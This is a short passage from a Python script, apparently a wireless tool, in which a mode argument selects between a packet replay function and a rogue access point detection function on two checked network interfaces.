    elif args.mode == "2":
        check_interface(capture_iface)
        check_interface(replay_iface)
        mode_replay(capture_iface, replay_iface, args.use_5ghz)
    elif args.mode == "3":
        check_interface(capture_iface)
        check_interface(replay_iface)
        mode_rogue_detect(capture_iface, replay_iface, args.use_5ghz)
